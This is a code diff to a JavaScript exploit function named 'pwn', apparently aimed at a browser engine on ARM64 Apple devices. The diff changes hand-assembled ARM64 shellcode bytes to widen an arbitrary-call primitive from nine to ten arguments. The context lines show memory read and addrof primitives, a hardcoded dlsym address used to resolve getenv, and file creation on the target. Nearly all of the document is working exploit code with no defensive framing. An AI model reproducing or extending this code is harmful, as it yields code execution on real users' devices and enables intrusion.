@@ -259,7 +259,6 @@ function pwn() {
         0x00, 0x00, 0x00, 0x10, // adr x0, #0
         0x11, 0x24, 0x40, 0xF9, // ldr x17, [x0, #0x48]
         0x35, 0x02, 0x40, 0xF9, // ldr x21, [x17]
-        0x36, 0x22, 0x00, 0x91, // add x22, x17, #8
         0x20, 0x0A, 0x40, 0xF9, // ldr x0, [x17, #0x10]
         0x21, 0x0E, 0x40, 0xF9, // ldr x1, [x17, #0x18]
         0x22, 0x12, 0x40, 0xF9, // ldr x2, [x17, #0x20]
@@ -269,10 +268,11 @@ function pwn() {
         0x26, 0x22, 0x40, 0xF9, // ldr x6, [x17, #0x40]
         0x27, 0x26, 0x40, 0xF9, // ldr x7, [x17, #0x48]
         0x28, 0x2A, 0x40, 0xF9, // ldr x8, [x17, #0x50]
+        0x29, 0x2E, 0x40, 0xF9, // ldr x9, [x17, #0x58]
         0xF7, 0x03, 0x1E, 0xAA, // mov x23, x30
         0xA0, 0x02, 0x3F, 0xD6, // blr x21
         0xFE, 0x03, 0x17, 0xAA, // mov x30, x23
-        0xC0, 0x02, 0x00, 0xF9, // str x0, [x22]
+        0x20, 0x06, 0x00, 0xF9, // str x0, [x17, #8]
         0xC0, 0x03, 0x5F, 0xD6, // ret
         
         // arbCallContext address here
@@ -281,7 +281,7 @@ function pwn() {
     ]);
     
     // initialize arbitrary call primitive
-    let arbCallContext = new BigUint64Array(11);
+    let arbCallContext = new BigUint64Array(12);
     let arbCallContextAddr = read64(addrof(arbCallContext) + 0x10);
     log(`[+] arbCallContext address: 0x${arbCallContextAddr.toString(16)}`);
     new DataView(arbCallBytes.buffer).setBigUint64(0x48, BigInt(arbCallContextAddr), true);
@@ -299,8 +299,8 @@ function pwn() {
     
     // function to make an arbitrary call
     function arbCall(func, ...args) {
-        if (args.length > 9) {
-            log("[+] Only 9 args are allowed!\n");
+        if (args.length > 10) {
+            log("[+] Only 10 args are allowed!\n");
             return -1;
         }
         arbCallContext.fill(0n);
@@ -323,6 +323,10 @@ function pwn() {
         shellcodeFunc();
         return arbCallContext[1];
     }
+    
+    
+    // crash to verify thread state in crash log
+    // arbCall(0xdeadbeefdeadbeef, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A);
     
     let dlsymAddr = 0x18039e2b8;
     let getenvAddr = arbCall(dlsymAddr, -2, "getenv");
@@ -387,7 +391,7 @@ function pwn() {
     const O_RDWR = 0x0002;
     const O_CREAT = 0x00000200;
     const O_TRUNC = 0x00000400;
-        
+    
     let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
     if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
         log("[+] Failed to open file!");
